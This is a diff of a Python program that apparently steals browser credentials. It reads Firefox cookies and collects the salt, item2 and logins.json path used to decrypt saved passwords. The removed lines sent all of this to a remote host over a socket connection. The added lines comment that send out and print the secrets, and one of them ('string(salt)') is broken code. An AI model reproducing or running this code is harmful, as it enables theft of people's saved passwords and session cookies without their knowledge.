@@ -1,5 +1,5 @@
 from abc import ABC, abstractmethod
-import os, socket, platform, sqlite3, base64, json;
+import os, socket, platform, sqlite3;
 
 
 # * Classes to detect Operating System
@@ -107,21 +107,7 @@ class FirefoxCookiesGetter(BrowserCookiesGetter):
             cookies = cursor.fetchall()
             connection.close()
 
-
-
-            cookiesData = []
-
-            for register in cookies:
-
-                cookiesData.append({
-                    "name": register[0],
-                    "cookie": register[1],
-                    "host": register[2]
-                });
-
-
-
-            return cookiesData;
+            return cookies;
 
         except Exception as e:
             return f"Database is locked {e}";
@@ -274,23 +260,34 @@ def Main():
 
     salt, item2, loginsFilePath = PasswordsGetter.GetPasswordInLinux();
 
+    string(salt)
+    
+    print(salt)
+    
 
 
+    print(f"Salt: {salt}");
+    print(f"item2: {item2}");
 
-    sender.EstablishConnection()
-    sender.SendData(data=json.dumps({
-        "cookies": cookies,
-        "logins.json": sender.ExtractDataFromFile(loginsFilePath),        
-        "decrypt": {
-            "salt": base64.b64encode(salt).decode("utf-8"),
-            "item2": base64.b64encode(item2).decode("utf-8")
-        }
     
-    }));
+
     
-    
-    sender.CloseConnection();
-    
+
+
+    #
+    # sender.EstablishConnection()
+    # sender.SendData(data={
+    #     "cookies": cookies,
+    #     "logins.json": sender.ExtractDataFromFile(loginsFilePath),        
+    #     "decrypt": {
+    #         "salt": salt,
+    #         "item2": item2
+    #     }
+    # });
+    #
+    #
+    # sender.CloseConnection();
+    # 
 
 
 
